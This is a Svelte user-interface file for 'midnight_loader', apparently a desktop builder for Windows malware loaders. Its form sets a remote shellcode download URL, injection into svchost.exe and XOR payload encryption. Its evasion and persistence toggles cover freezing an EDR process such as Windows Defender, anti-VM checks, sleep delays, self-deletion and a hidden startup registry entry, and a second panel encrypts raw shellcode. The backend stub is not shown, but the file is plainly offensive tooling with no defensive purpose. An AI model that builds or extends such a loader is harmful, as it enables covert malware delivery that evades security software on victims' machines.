<script>
  import { onMount, tick } from 'svelte'
  import { EventsOn } from '@wailsapp/runtime'
  import { Build, GenerateKey, EncryptFile, CheckDeps, PickFile, PickDir } from '../wailsjs/go/main/App.js'
  import { logs, status } from './stores.js'
  import StatusBadge from './lib/StatusBadge.svelte'

  let cfg = {
    shellcode_url: '',
    injection_target: 'C:\\Windows\\System32\\svchost.exe',
    xor_key: '',
    output_path: '',
    enable_admin: false,
    enable_anti_vm: false,
    sleep_delay: false,
    enable_melt: false,
    enable_startup: false,
    hide_directory: false,
    edr_process_name: '',
    freeze_time_ms: 3000,
    startup_entry_name: '',
    directory_name: '',
    file_name: ''
  }

  let deps = { 'g++': true }
  let encInputPath = ''
  let encOutputPath = ''
  let encKey = ''
  let encStatus = ''
  let logContainer

  async function scrollToBottom() {
    await tick()
    if (logContainer) {
      logContainer.scrollTop = logContainer.scrollHeight
    }
  }

  $: if ($logs && logContainer) {
    scrollToBottom()
  }

  onMount(async () => {
    try {
      deps = await CheckDeps()
    } catch (e) {
      console.error(e)
    }

    EventsOn('build:log', async (line) => {
      logs.update((l) => [...l, line])
      await scrollToBottom()
    })
  })

  async function generateConfigKey() {
    cfg.xor_key = await GenerateKey()
  }

  async function browseOutputPath() {
    const dir = await PickDir()
    if (dir) {
      cfg.output_path = dir
    }
  }

  async function browseEncInput() {
    const file = await PickFile('*.*')
    if (file) {
      encInputPath = file
      if (!encOutputPath) {
        encOutputPath = file.includes('.') ? file.replace(/(\.[^.]+)$/, '_xor$1') : file + '_xor.bin'
      }
    }
  }

  async function browseEncOutput() {
    const dir = await PickDir()
    if (dir) {
      const fileName = encInputPath ? encInputPath.split(/[/\\]/).pop() : 'payload.bin'
      const outName = fileName.includes('.') ? fileName.replace(/(\.[^.]+)$/, '_xor$1') : fileName + '_xor.bin'
      const separator = dir.includes('\\') ? '\\' : '/'
      encOutputPath = dir.endsWith(separator) ? dir + outName : dir + separator + outName
    }
  }

  async function generateEncKey() {
    encKey = await GenerateKey()
  }

  async function handleEncrypt() {
    if (!encInputPath) {
      encStatus = 'error: select an input file first'
      return
    }
    if (!encOutputPath) {
      encStatus = 'error: specify an output path'
      return
    }
    const keyToUse = encKey || cfg.xor_key || (await GenerateKey())
    if (!encKey) {
      encKey = keyToUse
    }
    try {
      await EncryptFile(encInputPath, encOutputPath, keyToUse)
      encStatus = `saved encrypted payload: ${encOutputPath}`
    } catch (err) {
      encStatus = `encrypt failed: ${err}`
    }
  }

  async function handleBuild() {
    logs.set([])
    status.set('building')
    try {
      await Build(cfg)
      status.set('success')
    } catch (err) {
      logs.update((l) => [...l, `[error] ${err}`])
      status.set('error')
    }
  }
</script>

<main class="container">
  <header class="header">
    <div class="title-row">
      <h1>midnight_loader</h1>
      <StatusBadge status={$status} />
    </div>
    {#if deps && !deps['g++']}
      <div class="warning-banner">
        warning: g++ compiler not found on path. compilation will fail.
      </div>
    {/if}
  </header>

  <section class="card">
    <h2>Payload & Loader Configuration</h2>
    <div class="form-grid">
      <div class="field">
        <label for="shellcode-url">Shellcode URL</label>
        <input id="shellcode-url" type="text" bind:value={cfg.shellcode_url} placeholder="http://10.10.10.10:8080/payload_xor.bin" />
      </div>

      <div class="field">
        <label for="injection-target">Injection Target</label>
        <input id="injection-target" type="text" bind:value={cfg.injection_target} placeholder="C:\Windows\System32\svchost.exe" />
      </div>

      <div class="field">
        <label for="xor-key">XOR Key</label>
        <div class="input-with-action">
          <input id="xor-key" type="text" bind:value={cfg.xor_key} placeholder="leave blank to auto-generate" />
          <button type="button" class="btn secondary" on:click={generateConfigKey}>Generate</button>
        </div>
      </div>

      <div class="field">
        <label for="output-path">Output Directory</label>
        <div class="input-with-action">
          <input id="output-path" type="text" bind:value={cfg.output_path} placeholder="select build output directory" />
          <button type="button" class="btn secondary" on:click={browseOutputPath}>Browse</button>
        </div>
      </div>

      <div class="field">
        <label for="edr-proc">EDR Process Name <span class="dim">(optional)</span></label>
        <input id="edr-proc" type="text" bind:value={cfg.edr_process_name} placeholder="MsMpEng.exe" />
      </div>

      <div class="field">
        <label for="freeze-ms">Freeze Duration (ms)</label>
        <input id="freeze-ms" type="number" bind:value={cfg.freeze_time_ms} min="500" max="60000" step="500" />
      </div>
    </div>

    <div class="toggles-title">Evasion & Persistence Options</div>
    <div class="toggles-grid">
      <label class="checkbox-label">
        <input type="checkbox" bind:checked={cfg.enable_admin} />
        <span>Enable Admin Check</span>
      </label>
      <label class="checkbox-label">
        <input type="checkbox" bind:checked={cfg.enable_anti_vm} />
        <span>Enable Anti-VM</span>
      </label>
      <label class="checkbox-label">
        <input type="checkbox" bind:checked={cfg.sleep_delay} />
        <span>Enable Sleep Delay</span>
      </label>
      <label class="checkbox-label">
        <input type="checkbox" bind:checked={cfg.enable_melt} />
        <span>Enable Self-Melt</span>
      </label>
      <label class="checkbox-label">
        <input type="checkbox" bind:checked={cfg.enable_startup} />
        <span>Enable Startup Registry</span>
      </label>
      {#if cfg.enable_startup}
        <label class="checkbox-label">
          <input type="checkbox" bind:checked={cfg.hide_directory} />
          <span>Hide Startup Directory</span>
        </label>
      {/if}
    </div>

    <div class="build-actions">
      <button
        type="button"
        class="btn primary"
        disabled={$status === 'building'}
        on:click={handleBuild}
      >
        {$status === 'building' ? 'Compiling Stub...' : 'Build Loader'}
      </button>
    </div>
  </section>

  <section class="card">
    <h2>Encrypt File (Shellcode Pre-processor)</h2>
    <div class="form-grid">
      <div class="field">
        <label for="enc-input">Input File Path</label>
        <div class="input-with-action">
          <input id="enc-input" type="text" bind:value={encInputPath} placeholder="select raw shellcode binary" />
          <button type="button" class="btn secondary" on:click={browseEncInput}>Browse</button>
        </div>
      </div>

      <div class="field">
        <label for="enc-output">Output File Path</label>
        <div class="input-with-action">
          <input id="enc-output" type="text" bind:value={encOutputPath} placeholder="output encrypted binary path" />
          <button type="button" class="btn secondary" on:click={browseEncOutput}>Directory</button>
        </div>
      </div>

      <div class="field">
        <label for="enc-key">Encryption Key</label>
        <div class="input-with-action">
          <input id="enc-key" type="text" bind:value={encKey} placeholder="key or leave blank to generate" />
          <button type="button" class="btn secondary" on:click={generateEncKey}>Generate</button>
        </div>
      </div>
    </div>

    <div class="encrypt-actions">
      <button type="button" class="btn secondary" on:click={handleEncrypt}>Encrypt</button>
      {#if encStatus}
        <span class="enc-msg" class:error={encStatus.startsWith('error')}>{encStatus}</span>
      {/if}
    </div>
  </section>

  <section class="card logs-card">
    <div class="logs-header">
      <h2>Build Console</h2>
      <button type="button" class="btn small" on:click={() => logs.set([])}>Clear</button>
    </div>
    <div id="log-panel" bind:this={logContainer} class="log-view">
      {#if $logs.length === 0}
        <div class="placeholder">ready. click "Build Loader" to start compilation.</div>
      {/if}
      {#each $logs as line}
        <div class="log-line" class:err={line.startsWith('[g++]') || line.startsWith('[error]')} class:ok={line.startsWith('[success]')}>
          {line}
        </div>
      {/each}
    </div>
  </section>
</main>

<style>
  :global(body) {
    background-color: #1a1a2e;
    color: #e2e8f0;
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  .container {
    max-width: 900px;
    margin: 0 auto;
    padding: 1.5rem 1rem 3rem 1rem;
    box-sizing: border-box;
  }

  .header {
    margin-bottom: 1.25rem;
  }

  .title-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid #2e2e4a;
  }

  h1 {
    color: #e040fb;
    font-size: 1.75rem;
    margin: 0;
    font-family: monospace;
    letter-spacing: -0.03em;
  }

  h2 {
    color: #f1f5f9;
    font-size: 1rem;
    font-weight: 600;
    margin: 0 0 1rem 0;
    letter-spacing: -0.01em;
  }

  .warning-banner {
    background-color: #3b2408;
    color: #fbd38d;
    border: 1px solid #d69e2e;
    padding: 0.6rem 0.9rem;
    border-radius: 4px;
    margin-top: 0.75rem;
    font-size: 0.85rem;
    font-family: monospace;
  }

  .card {
    background-color: #161626;
    border: 1px solid #282846;
    border-radius: 6px;
    padding: 1.25rem;
    margin-bottom: 1.25rem;
  }

  .form-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
    gap: 0.9rem 1.2rem;
  }

  .field {
    display: flex;
    flex-direction: column;
    gap: 0.35rem;
  }

  label {
    color: #94a3b8;
    font-size: 0.8rem;
    font-weight: 500;
  }

  .dim {
    color: #64748b;
    font-weight: normal;
  }

  input[type="text"],
  input[type="number"] {
    background-color: #0f0f1c;
    border: 1px solid #2e2e4a;
    color: #f8fafc;
    padding: 0.5rem 0.65rem;
    border-radius: 4px;
    font-size: 0.85rem;
    font-family: monospace;
    outline: none;
    transition: border-color 0.15s ease;
    width: 100%;
    box-sizing: border-box;
  }

  input[type="text"]:focus,
  input[type="number"]:focus {
    border-color: #e040fb;
  }

  .input-with-action {
    display: flex;
    gap: 0.4rem;
  }

  .input-with-action input {
    flex: 1;
  }

  .toggles-title {
    color: #94a3b8;
    font-size: 0.8rem;
    font-weight: 600;
    margin: 1.1rem 0 0.5rem 0;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }

  .toggles-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 0.6rem;
    background-color: #0f0f1c;
    padding: 0.75rem;
    border-radius: 4px;
    border: 1px solid #222238;
  }

  .checkbox-label {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    color: #cbd5e1;
    font-size: 0.82rem;
    cursor: pointer;
    user-select: none;
  }

  .checkbox-label input[type="checkbox"] {
    accent-color: #e040fb;
    cursor: pointer;
  }

  .btn {
    padding: 0.5rem 1rem;
    border-radius: 4px;
    border: none;
    font-size: 0.85rem;
    font-weight: 600;
    cursor: pointer;
    transition: opacity 0.15s ease, background-color 0.15s ease;
  }

  .btn.primary {
    background-color: #e040fb;
    color: #0f0f1c;
  }

  .btn.primary:hover:not(:disabled) {
    background-color: #d030eb;
  }

  .btn.secondary {
    background-color: #27273f;
    color: #e2e8f0;
    border: 1px solid #363658;
  }

  .btn.secondary:hover:not(:disabled) {
    background-color: #343454;
  }

  .btn.small {
    padding: 0.25rem 0.6rem;
    font-size: 0.75rem;
    background-color: #27273f;
    color: #cbd5e1;
  }

  .btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }

  .build-actions {
    margin-top: 1.2rem;
    display: flex;
    justify-content: flex-end;
  }

  .encrypt-actions {
    margin-top: 1rem;
    display: flex;
    align-items: center;
    gap: 1rem;
  }

  .enc-msg {
    font-size: 0.8rem;
    font-family: monospace;
    color: #3ecf8e;
  }

  .enc-msg.error {
    color: #ff5c5c;
  }

  .logs-card {
    padding-bottom: 0.75rem;
  }

  .logs-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 0.6rem;
  }

  .logs-header h2 {
    margin: 0;
  }

  .log-view {
    background-color: #0c0c16;
    border: 1px solid #202036;
    border-radius: 4px;
    padding: 0.75rem;
    height: 220px;
    overflow-y: auto;
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    font-size: 0.8rem;
    line-height: 1.4;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .placeholder {
    color: #4b5563;
    font-style: italic;
  }

  .log-line {
    color: #cbd5e1;
  }

  .log-line.err {
    color: #ff5c5c;
  }

  .log-line.ok {
    color: #3ecf8e;
  }
</style>
